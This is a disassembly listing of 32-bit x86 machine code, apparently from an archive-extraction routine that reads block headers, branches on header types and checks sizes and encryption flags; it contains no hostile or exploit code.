  402c91:	80 be 42 89 00 00 05 	cmpb   $0x5,0x8942(%esi)
  402c98:	0f 87 2c 02 00 00    	ja     0x402eca
  402c9e:	8b 86 50 b0 00 00    	mov    0xb050(%esi),%eax
  402ca4:	0f b6 8e 41 89 00 00 	movzbl 0x8941(%esi),%ecx
  402cab:	83 e8 03             	sub    $0x3,%eax
  402cae:	f7 d8                	neg    %eax
  402cb0:	1b c0                	sbb    %eax,%eax
  402cb2:	83 e0 1d             	and    $0x1d,%eax
  402cb5:	3b c8                	cmp    %eax,%ecx
  402cb7:	0f 8f 0d 02 00 00    	jg     0x402eca
  402cbd:	8b 86 70 99 00 00    	mov    0x9970(%esi),%eax
  402cc3:	0b 86 74 99 00 00    	or     0x9974(%esi),%eax
  402cc9:	75 0f                	jne    0x402cda
  402ccb:	38 86 b1 99 00 00    	cmp    %al,0x99b1(%esi)
  402cd1:	75 07                	jne    0x402cda
  402cd3:	b0 01                	mov    $0x1,%al
  402cd5:	e9 fd 01 00 00       	jmp    0x402ed7
  402cda:	8d be e8 20 00 00    	lea    0x20e8(%esi),%edi
  402ce0:	8b cf                	mov    %edi,%ecx
  402ce2:	e8 80 87 00 00       	call   0x40b467
  402ce7:	57                   	push   %edi
  402ce8:	8d 8d 14 19 ff ff    	lea    -0xe6ec(%ebp),%ecx
  402cee:	e8 21 45 01 00       	call   0x417214
  402cf3:	33 db                	xor    %ebx,%ebx
  402cf5:	53                   	push   %ebx
  402cf6:	ff b6 0c 9a 00 00    	push   0x9a0c(%esi)
  402cfc:	8d 8d 14 19 ff ff    	lea    -0xe6ec(%ebp),%ecx
  402d02:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402d05:	e8 6c f5 00 00       	call   0x412276
  402d0a:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  402d0d:	75 56                	jne    0x402d65
  402d0f:	39 9e 7c 99 00 00    	cmp    %ebx,0x997c(%esi)
  402d15:	7c 2d                	jl     0x402d44
  402d17:	7f 0c                	jg     0x402d25
  402d19:	81 be 78 99 00 00 00 	cmpl   $0x1000000,0x9978(%esi)
  402d20:	00 00 01 
  402d23:	76 1f                	jbe    0x402d44
  402d25:	83 c6 1e             	add    $0x1e,%esi
  402d28:	56                   	push   %esi
  402d29:	6a 1c                	push   $0x1c
  402d2b:	e8 a0 e5 ff ff       	call   0x4012d0
  402d30:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  402d34:	8d 8d 14 19 ff ff    	lea    -0xe6ec(%ebp),%ecx
  402d3a:	e8 56 24 01 00       	call   0x415195
  402d3f:	e9 91 01 00 00       	jmp    0x402ed5
  402d44:	8b 5d 08             	mov    0x8(%ebp),%ebx
  402d47:	ff b6 78 99 00 00    	push   0x9978(%esi)
  402d4d:	8b cb                	mov    %ebx,%ecx
  402d4f:	e8 cd ee ff ff       	call   0x401c21
  402d54:	ff b6 78 99 00 00    	push   0x9978(%esi)
  402d5a:	8b cf                	mov    %edi,%ecx
  402d5c:	ff 33                	push   (%ebx)
  402d5e:	e8 7a 88 00 00       	call   0x40b5dd
  402d63:	33 db                	xor    %ebx,%ebx
  402d65:	80 be b3 99 00 00 00 	cmpb   $0x0,0x99b3(%esi)
  402d6c:	74 52                	je     0x402dc0
  402d6e:	8b 86 24 65 00 00    	mov    0x6524(%esi),%eax
  402d74:	80 b8 20 41 00 00 00 	cmpb   $0x0,0x4120(%eax)
  402d7b:	74 b3                	je     0x402d30
  402d7d:	0f b6 96 b8 99 00 00 	movzbl 0x99b8(%esi),%edx
  402d84:	8d 8e e3 99 00 00    	lea    0x99e3(%esi),%ecx
  402d8a:	51                   	push   %ecx
  402d8b:	8d 8e da 99 00 00    	lea    0x99da(%esi),%ecx
  402d91:	51                   	push   %ecx
  402d92:	ff b6 04 9a 00 00    	push   0x9a04(%esi)
  402d98:	8d 8e c9 99 00 00    	lea    0x99c9(%esi),%ecx
  402d9e:	51                   	push   %ecx
  402d9f:	f7 da                	neg    %edx
  402da1:	1b d2                	sbb    %edx,%edx
  402da3:	8d 8e b9 99 00 00    	lea    0x99b9(%esi),%ecx
  402da9:	23 d1                	and    %ecx,%edx
  402dab:	52                   	push   %edx
  402dac:	05 20 40 00 00       	add    $0x4020,%eax
  402db1:	50                   	push   %eax
  402db2:	ff b6 b4 99 00 00    	push   0x99b4(%esi)
  402db8:	8b cf                	mov    %edi,%ecx
  402dba:	53                   	push   %ebx
  402dbb:	e8 d2 87 00 00       	call   0x40b592
  402dc0:	6a 01                	push   $0x1
  402dc2:	8d 9e 88 99 00 00    	lea    0x9988(%esi),%ebx
  402dc8:	ff 33                	push   (%ebx)
  402dca:	8d 8e b8 59 00 00    	lea    0x59b8(%esi),%ecx
  402dd0:	e8 38 68 00 00       	call   0x40960d
  402dd5:	8b 8e 74 99 00 00    	mov    0x9974(%esi),%ecx
  402ddb:	ff 75 0c             	push   0xc(%ebp)
  402dde:	8b 86 70 99 00 00    	mov    0x9970(%esi),%eax
  402de4:	89 8e 0c 21 00 00    	mov    %ecx,0x210c(%esi)
  402dea:	56                   	push   %esi
  402deb:	8b cf                	mov    %edi,%ecx
  402ded:	89 86 08 21 00 00    	mov    %eax,0x2108(%esi)
  402df3:	c6 86 10 21 00 00 00 	movb   $0x0,0x2110(%esi)
  402dfa:	e8 73 87 00 00       	call   0x40b572
  402dff:	8a 86 b1 99 00 00    	mov    0x99b1(%esi),%al
  402e05:	88 86 af 42 00 00    	mov    %al,0x42af(%esi)
  402e0b:	83 67 3c 00          	andl   $0x0,0x3c(%edi)
  402e0f:	8d 86 28 89 00 00    	lea    0x8928(%esi),%eax
  402e15:	89 47 38             	mov    %eax,0x38(%edi)
  402e18:	80 be 42 89 00 00 00 	cmpb   $0x0,0x8942(%esi)
  402e1f:	8b 86 78 99 00 00    	mov    0x9978(%esi),%eax
  402e25:	8b 8e 7c 99 00 00    	mov    0x997c(%esi),%ecx
  402e2b:	89 85 54 65 ff ff    	mov    %eax,-0x9aac(%ebp)
  402e31:	89 8d 58 65 ff ff    	mov    %ecx,-0x9aa8(%ebp)
  402e37:	c6 85 6c 65 ff ff 00 	movb   $0x0,-0x9a94(%ebp)
  402e3e:	75 0a                	jne    0x402e4a
  402e40:	51                   	push   %ecx
  402e41:	50                   	push   %eax
  402e42:	57                   	push   %edi
  402e43:	e8 64 41 00 00       	call   0x406fac
  402e48:	eb 15                	jmp    0x402e5f
  402e4a:	0f b6 86 41 89 00 00 	movzbl 0x8941(%esi),%eax
  402e51:	6a 00                	push   $0x0
  402e53:	50                   	push   %eax
  402e54:	8d 8d 14 19 ff ff    	lea    -0xe6ec(%ebp),%ecx
  402e5a:	e8 1e 58 01 00       	call   0x41867d
  402e5f:	0f b6 8e e2 99 00 00 	movzbl 0x99e2(%esi),%ecx
  402e66:	f7 d9                	neg    %ecx
  402e68:	1b c9                	sbb    %ecx,%ecx
  402e6a:	8d 86 e3 99 00 00    	lea    0x99e3(%esi),%eax
  402e70:	23 c8                	and    %eax,%ecx
  402e72:	51                   	push   %ecx
  402e73:	53                   	push   %ebx
  402e74:	8d 8e b8 59 00 00    	lea    0x59b8(%esi),%ecx
  402e7a:	e8 f2 69 00 00       	call   0x409871
  402e7f:	84 c0                	test   %al,%al
  402e81:	75 33                	jne    0x402eb6
  402e83:	8d 86 48 89 00 00    	lea    0x8948(%esi),%eax
  402e89:	50                   	push   %eax
  402e8a:	83 c6 1e             	add    $0x1e,%esi
  402e8d:	56                   	push   %esi
  402e8e:	6a 1d                	push   $0x1d
  402e90:	e8 68 34 00 00       	call   0x4062fd
  402e95:	6a 03                	push   $0x3
  402e97:	b9 ac 25 43 00       	mov    $0x4325ac,%ecx
  402e9c:	e8 b6 33 00 00       	call   0x406257
  402ea1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402ea4:	85 c9                	test   %ecx,%ecx
  402ea6:	0f 84 84 fe ff ff    	je     0x402d30
  402eac:	e8 46 f7 00 00       	call   0x4125f7
  402eb1:	e9 7a fe ff ff       	jmp    0x402d30
  402eb6:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  402eba:	8d 8d 14 19 ff ff    	lea    -0xe6ec(%ebp),%ecx
  402ec0:	e8 d0 22 01 00       	call   0x415195
  402ec5:	e9 09 fe ff ff       	jmp    0x402cd3
  402eca:	83 c6 1e             	add    $0x1e,%esi
  402ecd:	56                   	push   %esi
  402ece:	6a 1c                	push   $0x1c
  402ed0:	e8 fb e3 ff ff       	call   0x4012d0
  402ed5:	32 c0                	xor    %al,%al
  402ed7:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402eda:	5f                   	pop    %edi
  402edb:	5e                   	pop    %esi
  402edc:	5b                   	pop    %ebx
  402edd:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402ee4:	c9                   	leave
  402ee5:	c2 08 00             	ret    $0x8
  402ee8:	55                   	push   %ebp
  402ee9:	83 ec 50             	sub    $0x50,%esp
  402eec:	b8 49 91 42 00       	mov    $0x429149,%eax
  402ef1:	e8 66 71 01 00       	call   0x41a05c
  402ef6:	b8 70 20 00 00       	mov    $0x2070,%eax
  402efb:	e8 70 77 01 00       	call   0x41a670
  402f00:	53                   	push   %ebx
  402f01:	56                   	push   %esi
  402f02:	8b d9                	mov    %ecx,%ebx
  402f04:	57                   	push   %edi
  402f05:	53                   	push   %ebx
  402f06:	8d 4d 28             	lea    0x28(%ebp),%ecx
  402f09:	e8 37 85 00 00       	call   0x40b445
  402f0e:	33 ff                	xor    %edi,%edi
  402f10:	80 bb 5c b0 00 00 00 	cmpb   $0x0,0xb05c(%ebx)
  402f17:	89 7d fc             	mov    %edi,-0x4(%ebp)
  402f1a:	74 4f                	je     0x402f6b
  402f1c:	8b 83 60 b0 00 00    	mov    0xb060(%ebx),%eax
  402f22:	8b 93 44 b0 00 00    	mov    0xb044(%ebx),%edx
  402f28:	33 c9                	xor    %ecx,%ecx
  402f2a:	83 c0 08             	add    $0x8,%eax
  402f2d:	13 cf                	adc    %edi,%ecx
  402f2f:	3b d1                	cmp    %ecx,%edx
  402f31:	7c 38                	jl     0x402f6b
  402f33:	7f 0a                	jg     0x402f3f
  402f35:	8b 8b 40 b0 00 00    	mov    0xb040(%ebx),%ecx
  402f3b:	3b c8                	cmp    %eax,%ecx
  402f3d:	76 2c                	jbe    0x402f6b
  402f3f:	8b cb                	mov    %ebx,%ecx
  402f41:	c6 45 53 01          	movb   $0x1,0x53(%ebp)
  402f45:	e8 84 ec ff ff       	call   0x401bce
  402f4a:	8b 03                	mov    (%ebx),%eax
  402f4c:	6a 10                	push   $0x10
  402f4e:	8d 4d 10             	lea    0x10(%ebp),%ecx
  402f51:	51                   	push   %ecx
  402f52:	8b cb                	mov    %ebx,%ecx
  402f54:	ff 50 08             	call   *0x8(%eax)
  402f57:	83 f8 10             	cmp    $0x10,%eax
  402f5a:	74 15                	je     0x402f71
  402f5c:	8b cb                	mov    %ebx,%ecx
  402f5e:	e8 d8 ec ff ff       	call   0x401c3b
  402f63:	39 7d 28             	cmp    %edi,0x28(%ebp)
  402f66:	e9 d1 06 00 00       	jmp    0x40363c
  402f6b:	c6 45 53 00          	movb   $0x0,0x53(%ebp)
  402f6f:	eb 7a                	jmp    0x402feb
  402f71:	8d 45 20             	lea    0x20(%ebp),%eax
  402f74:	50                   	push   %eax
  402f75:	57                   	push   %edi
  402f76:	ff b3 c8 65 00 00    	push   0x65c8(%ebx)
  402f7c:	8d 45 10             	lea    0x10(%ebp),%eax
  402f7f:	50                   	push   %eax
  402f80:	8d 83 cc 65 00 00    	lea    0x65cc(%ebx),%eax
  402f86:	50                   	push   %eax
  402f87:	8b 83 24 65 00 00    	mov    0x6524(%ebx),%eax
  402f8d:	05 20 40 00 00       	add    $0x4020,%eax
  402f92:	50                   	push   %eax
  402f93:	6a 05                	push   $0x5
  402f95:	8d b3 24 10 00 00    	lea    0x1024(%ebx),%esi
  402f9b:	57                   	push   %edi
  402f9c:	8b ce                	mov    %esi,%ecx
  402f9e:	e8 e1 2f 00 00       	call   0x405f84
  402fa3:	80 bb c4 65 00 00 00 	cmpb   $0x0,0x65c4(%ebx)
  402faa:	74 3c                	je     0x402fe8
  402fac:	6a 08                	push   $0x8
  402fae:	8d 83 dc 65 00 00    	lea    0x65dc(%ebx),%eax
  402fb4:	50                   	push   %eax
  402fb5:	8d 45 20             	lea    0x20(%ebp),%eax
  402fb8:	50                   	push   %eax
  402fb9:	e8 c6 77 01 00       	call   0x41a784
  402fbe:	83 c4 0c             	add    $0xc,%esp
  402fc1:	85 c0                	test   %eax,%eax
  402fc3:	74 23                	je     0x402fe8
  402fc5:	8d 43 1e             	lea    0x1e(%ebx),%eax
  402fc8:	50                   	push   %eax
  402fc9:	6a 06                	push   $0x6
  402fcb:	e8 00 e3 ff ff       	call   0x4012d0
  402fd0:	6a 0b                	push   $0xb
  402fd2:	b9 ac 25 43 00       	mov    $0x4325ac,%ecx
  402fd7:	c6 83 65 b0 00 00 01 	movb   $0x1,0xb065(%ebx)
  402fde:	e8 74 32 00 00       	call   0x406257
  402fe3:	e9 7b ff ff ff       	jmp    0x402f63
  402fe8:	89 75 44             	mov    %esi,0x44(%ebp)
  402feb:	6a 07                	push   $0x7
  402fed:	8d 4d 28             	lea    0x28(%ebp),%ecx
  402ff0:	e8 e2 81 00 00       	call   0x40b1d7
  402ff5:	83 f8 07             	cmp    $0x7,%eax
  402ff8:	0f 82 5e ff ff ff    	jb     0x402f5c
  402ffe:	8d 4d 28             	lea    0x28(%ebp),%ecx
  403001:	c6 83 5c 65 00 00 00 	movb   $0x0,0x655c(%ebx)
  403008:	8d b3 4c 65 00 00    	lea    0x654c(%ebx),%esi
  40300e:	e8 ab 82 00 00       	call   0x40b2be
  403013:	6a 04                	push   $0x4
  403015:	8d 4d 28             	lea    0x28(%ebp),%ecx
  403018:	89 06                	mov    %eax,(%esi)
  40301a:	e8 60 83 00 00       	call   0x40b37f
  40301f:	8d 4d 28             	lea    0x28(%ebp),%ecx
  403022:	8b f8                	mov    %eax,%edi
  403024:	e8 f3 82 00 00       	call   0x40b31c
  403029:	8b c8                	mov    %eax,%ecx
  40302b:	0b ca                	or     %edx,%ecx
  40302d:	0f 84 fe 05 00 00    	je     0x403631
  403033:	85 ff                	test   %edi,%edi
  403035:	0f 84 f6 05 00 00    	je     0x403631
  40303b:	03 c7                	add    %edi,%eax
  40303d:	8d 48 fd             	lea    -0x3(%eax),%ecx
  403040:	8d 78 04             	lea    0x4(%eax),%edi
  403043:	85 c9                	test   %ecx,%ecx
  403045:	0f 8c e6 05 00 00    	jl     0x403631
  40304b:	83 ff 07             	cmp    $0x7,%edi
  40304e:	0f 82 dd 05 00 00    	jb     0x403631
  403054:	51                   	push   %ecx
  403055:	8d 4d 28             	lea    0x28(%ebp),%ecx
  403058:	e8 7a 81 00 00       	call   0x40b1d7
  40305d:	39 7d 3c             	cmp    %edi,0x3c(%ebp)
  403060:	73 0c                	jae    0x40306e
  403062:	8b cb                	mov    %ebx,%ecx
  403064:	e8 d2 eb ff ff       	call   0x401c3b
  403069:	e9 ca 05 00 00       	jmp    0x403638
  40306e:	8d 4d 28             	lea    0x28(%ebp),%ecx
  403071:	e8 af 83 00 00       	call   0x40b425
  403076:	8d 4d 28             	lea    0x28(%ebp),%ecx
  403079:	89 45 4c             	mov    %eax,0x4c(%ebp)
  40307c:	e8 9b 82 00 00       	call   0x40b31c
  403081:	8d 4d 28             	lea    0x28(%ebp),%ecx
  403084:	89 83 50 65 00 00    	mov    %eax,0x6550(%ebx)
  40308a:	e8 8d 82 00 00       	call   0x40b31c
  40308f:	89 83 54 65 00 00    	mov    %eax,0x6554(%ebx)
  403095:	c1 e8 02             	shr    $0x2,%eax
  403098:	24 01                	and    $0x1,%al
  40309a:	88 83 5c 65 00 00    	mov    %al,0x655c(%ebx)
  4030a0:	8b 83 50 65 00 00    	mov    0x6550(%ebx),%eax
  4030a6:	89 83 44 65 00 00    	mov    %eax,0x6544(%ebx)
  4030ac:	8b 45 4c             	mov    0x4c(%ebp),%eax
  4030af:	39 06                	cmp    %eax,(%esi)
  4030b1:	89 bb 58 65 00 00    	mov    %edi,0x6558(%ebx)
  4030b7:	0f 95 45 4b          	setne  0x4b(%ebp)
  4030bb:	80 7d 4b 00          	cmpb   $0x0,0x4b(%ebp)
  4030bf:	74 38                	je     0x4030f9
  4030c1:	8b cb                	mov    %ebx,%ecx
  4030c3:	e8 bc eb ff ff       	call   0x401c84
  4030c8:	6a 03                	push   $0x3
  4030ca:	b9 ac 25 43 00       	mov    $0x4325ac,%ecx
  4030cf:	c6 83 64 b0 00 00 01 	movb   $0x1,0xb064(%ebx)
  4030d6:	e8 7c 31 00 00       	call   0x406257
  4030db:	80 7d 53 00          	cmpb   $0x0,0x53(%ebp)
  4030df:	74 18                	je     0x4030f9
  4030e1:	8d 43 1e             	lea    0x1e(%ebx),%eax
  4030e4:	50                   	push   %eax
  4030e5:	50                   	push   %eax
  4030e6:	6a 04                	push   $0x4
  4030e8:	e8 10 32 00 00       	call   0x4062fd
  4030ed:	c6 83 65 b0 00 00 01 	movb   $0x1,0xb065(%ebx)
  4030f4:	e9 3f 05 00 00       	jmp    0x403638
  4030f9:	33 ff                	xor    %edi,%edi
  4030fb:	f6 83 54 65 00 00 01 	testb  $0x1,0x6554(%ebx)
  403102:	89 7d 18             	mov    %edi,0x18(%ebp)
  403105:	89 7d 1c             	mov    %edi,0x1c(%ebp)
  403108:	74 2d                	je     0x403137
  40310a:	8d 4d 28             	lea    0x28(%ebp),%ecx
  40310d:	e8 0a 82 00 00       	call   0x40b31c
  403112:	33 c9                	xor    %ecx,%ecx
  403114:	89 45 18             	mov    %eax,0x18(%ebp)
  403117:	8b 83 58 65 00 00    	mov    0x6558(%ebx),%eax
  40311d:	89 55 1c             	mov    %edx,0x1c(%ebp)
  403120:	3b d1                	cmp    %ecx,%edx
  403122:	72 13                	jb     0x403137
  403124:	77 05                	ja     0x40312b
  403126:	39 45 18             	cmp    %eax,0x18(%ebp)
  403129:	72 0c                	jb     0x403137
  40312b:	8b cb                	mov    %ebx,%ecx
  40312d:	e8 52 eb ff ff       	call   0x401c84
  403132:	e9 2c fe ff ff       	jmp    0x402f63
  403137:	f6 83 54 65 00 00 02 	testb  $0x2,0x6554(%ebx)
  40313e:	89 7d 20             	mov    %edi,0x20(%ebp)
  403141:	89 7d 24             	mov    %edi,0x24(%ebp)
  403144:	74 0e                	je     0x403154
  403146:	8d 4d 28             	lea    0x28(%ebp),%ecx
  403149:	e8 ce 81 00 00       	call   0x40b31c
  40314e:	89 45 20             	mov    %eax,0x20(%ebp)
  403151:	89 55 24             	mov    %edx,0x24(%ebp)
  403154:	ff b3 58 65 00 00    	push   0x6558(%ebx)
  40315a:	8b cb                	mov    %ebx,%ecx
  40315c:	e8 73 df ff ff       	call   0x4010d4
  403161:	33 c9                	xor    %ecx,%ecx
  403163:	03 83 40 b0 00 00    	add    0xb040(%ebx),%eax
  403169:	13 8b 44 b0 00 00    	adc    0xb044(%ebx),%ecx
  40316f:	03 45 20             	add    0x20(%ebp),%eax
  403172:	13 4d 24             	adc    0x24(%ebp),%ecx
  403175:	89 83 48 b0 00 00    	mov    %eax,0xb048(%ebx)
  40317b:	8b 83 50 65 00 00    	mov    0x6550(%ebx),%eax
  403181:	89 8b 4c b0 00 00    	mov    %ecx,0xb04c(%ebx)
  403187:	83 f8 01             	cmp    $0x1,%eax
  40318a:	0f 84 b9 03 00 00    	je     0x403549
  403190:	0f 8e 67 04 00 00    	jle    0x4035fd
  403196:	83 f8 03             	cmp    $0x3,%eax
  403199:	0f 8e 14 01 00 00    	jle    0x4032b3
  40319f:	83 f8 04             	cmp    $0x4,%eax
  4031a2:	74 3d                	je     0x4031e1
  4031a4:	83 f8 05             	cmp    $0x5,%eax
  4031a7:	0f 85 50 04 00 00    	jne    0x4035fd
  4031ad:	50                   	push   %eax
  4031ae:	59                   	pop    %ecx
  4031af:	8d bb e8 88 00 00    	lea    0x88e8(%ebx),%edi
  4031b5:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4031b7:	8d 4d 28             	lea    0x28(%ebp),%ecx
  4031ba:	e8 5d 81 00 00       	call   0x40b31c
  4031bf:	24 01                	and    $0x1,%al
  4031c1:	88 83 04 89 00 00    	mov    %al,0x8904(%ebx)
  4031c7:	c6 83 07 89 00 00 00 	movb   $0x0,0x8907(%ebx)
  4031ce:	c6 83 05 89 00 00 00 	movb   $0x0,0x8905(%ebx)
  4031d5:	c6 83 06 89 00 00 00 	movb   $0x0,0x8906(%ebx)
  4031dc:	e9 1c 04 00 00       	jmp    0x4035fd
  4031e1:	6a 05                	push   $0x5
  4031e3:	59                   	pop    %ecx
  4031e4:	8d bb b0 65 00 00    	lea    0x65b0(%ebx),%edi
  4031ea:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4031ec:	8d 4d 28             	lea    0x28(%ebp),%ecx
  4031ef:	e8 28 81 00 00       	call   0x40b31c
  4031f4:	85 c0                	test   %eax,%eax
  4031f6:	76 10                	jbe    0x403208
  4031f8:	8d 43 1e             	lea    0x1e(%ebx),%eax
  4031fb:	50                   	push   %eax
  4031fc:	8b cb                	mov    %ebx,%ecx
  4031fe:	e8 a4 ea ff ff       	call   0x401ca7
  403203:	e9 30 04 00 00       	jmp    0x403638
  403208:	8d 4d 28             	lea    0x28(%ebp),%ecx
  40320b:	e8 0c 81 00 00       	call   0x40b31c
  403210:	24 01                	and    $0x1,%al
  403212:	8d 4d 28             	lea    0x28(%ebp),%ecx
  403215:	88 83 c4 65 00 00    	mov    %al,0x65c4(%ebx)
  40321b:	e8 51 80 00 00       	call   0x40b271
  403220:	0f b6 c0             	movzbl %al,%eax
  403223:	89 83 c8 65 00 00    	mov    %eax,0x65c8(%ebx)
  403229:	83 f8 18             	cmp    $0x18,%eax
  40322c:	77 ca                	ja     0x4031f8
  40322e:	6a 10                	push   $0x10
  403230:	8d 83 cc 65 00 00    	lea    0x65cc(%ebx),%eax
  403236:	50                   	push   %eax
  403237:	8d 4d 28             	lea    0x28(%ebp),%ecx
  40323a:	e8 66 81 00 00       	call   0x40b3a5
  40323f:	80 bb c4 65 00 00 00 	cmpb   $0x0,0x65c4(%ebx)
  403246:	74 5f                	je     0x4032a7
  403248:	6a 08                	push   $0x8
  40324a:	8d b3 dc 65 00 00    	lea    0x65dc(%ebx),%esi
  403250:	56                   	push   %esi
  403251:	8d 4d 28             	lea    0x28(%ebp),%ecx
  403254:	e8 4c 81 00 00       	call   0x40b3a5
  403259:	6a 04                	push   $0x4
  40325b:	8d 45 4c             	lea    0x4c(%ebp),%eax
  40325e:	50                   	push   %eax
  40325f:	8d 4d 28             	lea    0x28(%ebp),%ecx
  403262:	e8 3e 81 00 00       	call   0x40b3a5
  403267:	8d 45 84             	lea    -0x7c(%ebp),%eax
  40326a:	50                   	push   %eax
  40326b:	e8 34 d0 00 00       	call   0x4102a4
  403270:	6a 08                	push   $0x8
  403272:	56                   	push   %esi
  403273:	8d 45 84             	lea    -0x7c(%ebp),%eax
  403276:	50                   	push   %eax
  403277:	e8 2a d3 00 00       	call   0x4105a6
  40327c:	8d 45 00             	lea    0x0(%ebp),%eax
  40327f:	50                   	push   %eax
  403280:	8d 45 84             	lea    -0x7c(%ebp),%eax
  403283:	50                   	push   %eax
  403284:	e8 96 d3 00 00       	call   0x41061f
  403289:	6a 04                	push   $0x4
  40328b:	8d 45 00             	lea    0x0(%ebp),%eax
  40328e:	50                   	push   %eax
  40328f:	8d 45 4c             	lea    0x4c(%ebp),%eax
  403292:	50                   	push   %eax
  403293:	e8 ec 74 01 00       	call   0x41a784
  403298:	83 c4 0c             	add    $0xc,%esp
  40329b:	f7 d8                	neg    %eax
  40329d:	1a c0                	sbb    %al,%al
  40329f:	fe c0                	inc    %al
  4032a1:	88 83 c4 65 00 00    	mov    %al,0x65c4(%ebx)
  4032a7:	c6 83 5c b0 00 00 01 	movb   $0x1,0xb05c(%ebx)
  4032ae:	e9 4a 03 00 00       	jmp    0x4035fd
  4032b3:	83 f8 02             	cmp    $0x2,%eax
  4032b6:	8d 83 e8 65 00 00    	lea    0x65e8(%ebx),%eax
  4032bc:	74 06                	je     0x4032c4
  4032be:	8d 83 28 89 00 00    	lea    0x8928(%ebx),%eax
  4032c4:	8b f8                	mov    %eax,%edi
  4032c6:	6a 00                	push   $0x0
  4032c8:	8b cf                	mov    %edi,%ecx
  4032ca:	89 45 4c             	mov    %eax,0x4c(%ebp)
  4032cd:	e8 fa 65 00 00       	call   0x4098cc
  4032d2:	8b 45 20             	mov    0x20(%ebp),%eax
  4032d5:	6a 05                	push   $0x5
  4032d7:	59                   	pop    %ecx
  4032d8:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4032da:	83 bb 50 65 00 00 02 	cmpl   $0x2,0x6550(%ebx)
  4032e1:	8b 75 4c             	mov    0x4c(%ebp),%esi
  4032e4:	89 86 48 10 00 00    	mov    %eax,0x1048(%esi)
  4032ea:	8b 45 24             	mov    0x24(%ebp),%eax
  4032ed:	8d 4d 28             	lea    0x28(%ebp),%ecx
  4032f0:	0f 94 45 53          	sete   0x53(%ebp)
  4032f4:	c6 86 e9 10 00 00 01 	movb   $0x1,0x10e9(%esi)
  4032fb:	89 86 4c 10 00 00    	mov    %eax,0x104c(%esi)
  403301:	e8 16 80 00 00       	call   0x40b31c
  403306:	8d 4d 28             	lea    0x28(%ebp),%ecx
  403309:	89 86 84 10 00 00    	mov    %eax,0x1084(%esi)
  40330f:	e8 08 80 00 00       	call   0x40b31c
  403314:	89 86 50 10 00 00    	mov    %eax,0x1050(%esi)
  40331a:	8b 86 84 10 00 00    	mov    0x1084(%esi),%eax
  403320:	c1 e8 03             	shr    $0x3,%eax
  403323:	24 01                	and    $0x1,%al
  403325:	89 96 54 10 00 00    	mov    %edx,0x1054(%esi)
  40332b:	88 86 8a 10 00 00    	mov    %al,0x108a(%esi)
  403331:	74 11                	je     0x403344
  403333:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  403338:	89 86 50 10 00 00    	mov    %eax,0x1050(%esi)
  40333e:	89 86 54 10 00 00    	mov    %eax,0x1054(%esi)
  403344:	8b 86 4c 10 00 00    	mov    0x104c(%esi),%eax
  40334a:	8b 8e 54 10 00 00    	mov    0x1054(%esi),%ecx
  403350:	3b c1                	cmp    %ecx,%eax
  403352:	8b 96 48 10 00 00    	mov    0x1048(%esi),%edx
  403358:	8b be 50 10 00 00    	mov    0x1050(%esi),%edi
  40335e:	7c 06                	jl     0x403366
  403360:	7f 08                	jg     0x40336a
  403362:	3b d7                	cmp    %edi,%edx
  403364:	77 04                	ja     0x40336a
  403366:	8b d7                	mov    %edi,%edx
  403368:	8b c1                	mov    %ecx,%eax
  40336a:	8d 4d 28             	lea    0x28(%ebp),%ecx
  40336d:	89 96 58 10 00 00    	mov    %edx,0x1058(%esi)
  403373:	89 86 5c 10 00 00    	mov    %eax,0x105c(%esi)
  403379:	e8 9e 7f 00 00       	call   0x40b31c
  40337e:	f6 86 84 10 00 00 02 	testb  $0x2,0x1084(%esi)
  403385:	89 46 1c             	mov    %eax,0x1c(%esi)
  403388:	74 16                	je     0x4033a0
  40338a:	8d 4d 28             	lea    0x28(%ebp),%ecx
  40338d:	e8 2c 7f 00 00       	call   0x40b2be
  403392:	6a 00                	push   $0x0
  403394:	50                   	push   %eax
  403395:	8d 8e 30 10 00 00    	lea    0x1030(%esi),%ecx
  40339b:	e8 69 db 00 00       	call   0x410f09
  4033a0:	8d 86 60 10 00 00    	lea    0x1060(%esi),%eax
  4033a6:	83 20 00             	andl   $0x0,(%eax)
  4033a9:	f6 86 84 10 00 00 04 	testb  $0x4,0x1084(%esi)
  4033b0:	74 14                	je     0x4033c6
  4033b2:	8d 4d 28             	lea    0x28(%ebp),%ecx
  4033b5:	c7 00 02 00 00 00    	movl   $0x2,(%eax)
  4033bb:	e8 fe 7e 00 00       	call   0x40b2be
  4033c0:	89 86 64 10 00 00    	mov    %eax,0x1064(%esi)
  4033c6:	83 a6 f0 10 00 00 00 	andl   $0x0,0x10f0(%esi)
  4033cd:	8d 4d 28             	lea    0x28(%ebp),%ecx
  4033d0:	e8 47 7f 00 00       	call   0x40b31c
  4033d5:	8b c8                	mov    %eax,%ecx
  4033d7:	c1 e9 07             	shr    $0x7,%ecx
  4033da:	80 e1 07             	and    $0x7,%cl
  4033dd:	89 45 4c             	mov    %eax,0x4c(%ebp)
  4033e0:	88 4e 1a             	mov    %cl,0x1a(%esi)
  4033e3:	24 3f                	and    $0x3f,%al
  4033e5:	8d 4d 28             	lea    0x28(%ebp),%ecx
  4033e8:	88 46 19             	mov    %al,0x19(%esi)
  4033eb:	e8 2c 7f 00 00       	call   0x40b31c
  4033f0:	8d 4d 28             	lea    0x28(%ebp),%ecx
  4033f3:	88 46 18             	mov    %al,0x18(%esi)
  4033f6:	e8 21 7f 00 00       	call   0x40b31c
  4033fb:	8a 56 18             	mov    0x18(%esi),%dl
  4033fe:	8b f8                	mov    %eax,%edi
  403400:	8b 83 54 65 00 00    	mov    0x6554(%ebx),%eax
  403406:	c1 e8 06             	shr    $0x6,%eax
  403409:	24 01                	and    $0x1,%al
  40340b:	8d 8e ec 10 00 00    	lea    0x10ec(%esi),%ecx
  403411:	88 86 e8 10 00 00    	mov    %al,0x10e8(%esi)
  403417:	c7 01 02 00 00 00    	movl   $0x2,(%ecx)
  40341d:	80 fa 01             	cmp    $0x1,%dl
  403420:	75 08                	jne    0x40342a
  403422:	c7 01 01 00 00 00    	movl   $0x1,(%ecx)
  403428:	eb 07                	jmp    0x403431
  40342a:	84 d2                	test   %dl,%dl
